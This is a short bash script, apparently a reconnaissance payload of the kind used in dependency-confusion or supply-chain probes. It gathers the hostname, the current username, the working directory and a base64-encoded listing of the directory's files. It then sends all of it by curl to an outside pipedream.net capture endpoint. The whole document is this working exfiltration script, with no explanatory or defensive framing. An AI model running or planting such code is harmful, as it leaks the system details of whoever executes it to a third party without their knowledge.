#!/bin/bash

curl -H "Hostname: $(hostname)" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -d "$(ls -la | base64)"  --http1.1  "eot7lh31glz15fb.m.pipedream.net"